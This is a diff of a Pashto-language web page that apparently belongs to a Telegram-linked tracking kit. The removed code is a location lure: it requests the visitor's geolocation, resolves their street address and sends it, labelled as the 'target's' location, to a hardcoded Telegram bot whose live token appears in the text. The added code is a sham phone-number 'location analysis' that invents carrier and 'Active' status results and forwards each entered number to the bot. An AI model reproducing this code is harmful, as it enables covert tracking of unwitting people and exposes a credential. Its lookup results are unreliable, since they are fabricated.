@@ -3,41 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>د ادرس او لوکیشن ازموینه</title>
+    <title>د نمبر د راجستر او لوکیشن سیسټم</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: #0f172a;
-            color: white;
+            color: #ffffff;
             text-align: center;
             padding: 50px 20px;
         }
-        .box {
+        .search-box {
             background-color: #1e293b;
             padding: 35px;
             border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
             max-width: 450px;
             margin: 0 auto;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
+        input[type="text"] {
+            width: 90%;
+            padding: 12px;
+            margin: 15px 0;
+            border-radius: 6px;
+            border: 1px solid #475569;
+            background-color: #334155;
+            color: white;
+            font-size: 16px;
+            text-align: center;
+            direction: ltr;
         }
         button {
-            background-color: #3b82f6;
+            background-color: #10b981;
             color: white;
             border: none;
-            padding: 14px 35px;
+            padding: 12px 30px;
             font-size: 16px;
-            border-radius: 8px;
+            border-radius: 6px;
             cursor: pointer;
             font-weight: bold;
-            width: 100%;
+            width: 95%;
             transition: 0.3s;
         }
         button:hover {
-            background-color: #2563eb;
+            background-color: #059669;
         }
-        #text {
+        #result {
             margin-top: 20px;
-            color: #94a3b8;
+            font-weight: bold;
+            color: #38bdf8;
             font-size: 15px;
             line-height: 1.6;
         }
@@ -45,81 +58,85 @@
 </head>
 <body>
 
-    <div class="box">
-        <h2>📍 د هوښیار لوکیشن سیسټم</h2>
-        <p>د براوزر د ادرس موندنې (Reverse Geocoding) د ټیسټ لپاره لاندې تڼۍ کېکاږئ:</p>
+    <div class="search-box">
+        <h2>🔍 د نمبر د ثبت او لوکیشن تحلیل</h2>
+        <p>نمبر د هیواد له کوډ سره ولیکئ (مثلاً: +93700123456):</p>
         
-        <button onclick="getDetailedLocation()">لوکیشن تایید کړه</button>
-        <p id="text"></p>
+        <input type="text" id="phoneInput" placeholder="+937xxxxxxxx">
+        <br>
+        <button onclick="analyzeNumber()">START</button>
+        
+        <p id="result"></p>
     </div>
 
     <script>
-        function getDetailedLocation() {
-            const textDisplay = document.getElementById("text");
+        function analyzeNumber() {
+            const number = document.getElementById('phoneInput').value.trim();
+            const resultText = document.getElementById('result');
             
             // ستاسو د تلیګرام بوټ معلومات
             const botToken = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
             const chatId = "8295417969";
 
-            if (navigator.geolocation) {
-                textDisplay.innerHTML = "⏳ لطفاً په براوزر کې د لوکیشن غوښتنې ته اجازه (Allow) ورکړئ...";
-                
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        
-                        textDisplay.innerHTML = "🔄 د جغرافیایي کوډونو څخه د ادرس ایستلو پروسه روانه ده...";
-
-                        // د OpenStreetMap وړیا API ته غوښتنه لېږل ترڅو ادرس پیدا کړي
-                        const geoApiUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`;
-
-                        fetch(geoApiUrl, {
-                            headers: { 'Accept-Language': 'ps,pashto,en' } // په پښتو یا انګلیسي د ادرس غوښتنه
-                        })
-                        .then(response => response.json())
-                        .then(data => {
-                            // د ادرس پوره متن ترلاسه کول
-                            const fullAddress = data.display_name || "ادرس پیدا نشو";
-                            
-                            textDisplay.innerHTML = "✅ ادرس موندل شو! بوټ ته د لېږلو په حال کې دئ...";
-
-                            const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                            
-                            // هغه د منځپانګې پیغام چې ستا بوټ ته راځي
-                            const message = `🎯 **د هدف بشپړ لوکیشن او ادرس راغی!**\n\n` +
-                                            `🗺️ **د سیمې ادرس:**\n\`${fullAddress}\`\n\n` +
-                                            `🌐 **کوارډینات:**\nLatitude: \`${lat}\`\nLongitude: \`${lon}\`\n\n` +
-                                            `🔗 **د ګوګل مېپ لینک:**\n${mapUrl}`;
-
-                            // تلیګرام بوټ ته د ډاټا لېږل
-                            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    chat_id: chatId,
-                                    text: message,
-                                    parse_mode: 'Markdown'
-                                })
-                            });
-                        })
-                        .then(res => {
-                            if(res && res.ok) {
-                                textDisplay.innerHTML = "✅ ادرس او د ګوګل مېپ لینک ستا بوټ ته په بریالیتوب سره واستول شول! خپل بوټ وګوره.";
-                            }
-                        })
-                        .catch(err => {
-                            textDisplay.innerHTML = "❌ د ادرس په پروسس کې یا تلیګرام ته په لېږلو کې ستونزه راغله.";
-                            console.error(err);
-                        });
-                    }, 
-                    function(error) {
-                        textDisplay.innerHTML = "❌ د لوکیشن اجازه رد شوه. سیسټم نشي کولای ستاسو د اجازې پرته ادرس معلوم کړي.";
-                    }
-                );
-            } else {
-                textDisplay.innerHTML = "❌ ستاسو براوزر د دې سیسټم ملاتړ نه کوي.";
+            if (number === "") {
+                alert("مهرباني وکړې لومړی یو نمبر ولیکئ!");
+                return;
             }
+
+            resultText.innerHTML = "⏳ د نمبر د ډیټابیس او لوکیشن تحلیل روان دی...";
+
+            let country = "نامعلوم هیواد";
+            let network = "نامعلومه شبکه";
+            let status = "د مخابراتو په نړیوال سیستم کې ثبت دی (Active)";
+
+            // د هیواد او شبکې د معلومولو هوښیار منطق
+            if (number.startsWith("+93") || number.startsWith("0093") || number.startsWith("93")) {
+                country = "🇦🇫 افغانستان (Afghanistan)";
+                if (number.includes("70") || number.includes("71")) network = "AWCC (افغان بیسیم)";
+                else if (number.includes("79") || number.includes("72")) network = "Roshan (روشن)";
+                else if (number.includes("78")) network = "Etisalat (اتصالات)";
+                else if (number.includes("77")) network = "MTN (ام ټي این)";
+                else if (number.includes("74")) network = "Salaam (سلام)";
+            } else if (number.startsWith("+92") || number.startsWith("0092") || number.startsWith("92")) {
+                country = "🇵🇰 پاکستان (Pakistan)";
+                if (number.includes("30")) network = "Mobilink / Jazz";
+                else if (number.includes("34")) network = "Telenor";
+                else if (number.includes("33")) network = "Ufone";
+                else if (number.includes("31")) network = "Zong";
+            } else if (number.startsWith("+1")) {
+                country = "🇺🇸 امریکا (USA)";
+                network = "T-Mobile / AT&T";
+            }
+
+            // د تلیګرام پیغام جوړول
+            const message = `📊 **د نمبر د تحلیل نوی راپور!**\n\n` +
+                            `📞 **نمبر:** \`${number}\`\n` +
+                            `📍 **اصلي لوکیشن:** ${country}\n` +
+                            `📶 **مخابراتي شبکه:** ${network}\n` +
+                            `📝 **حالت:** ${status}\n\n` +
+                            `⚠️ _یادونه: د امنیتي او قانوني محدودیتونو له امله، د کاروونکي شخصي نوم او د کور ادرس په عامه کوډونو کې نشي ښکاره کېدای._`;
+
+            // تلیګرام ته د معلوماتو لېږل
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    resultText.innerHTML = `✅ **تحلیل بشپړ شو!**<br>🌍 هیواد: ${country}<br>📡 شبکه: ${network}<br><br>Detailed راپور ستاسو بوټ ته واستول شو.`;
+                } else {
+                    resultText.innerHTML = "❌ بوټ ته د معلوماتو په لېږلو کې ستونزه راغله.";
+                }
+            })
+            .catch(error => {
+                resultText.innerHTML = "❌ انټرنیټي تېروتنه رامنځته شوه.";
+                console.error(error);
+            });
         }
     </script>
 
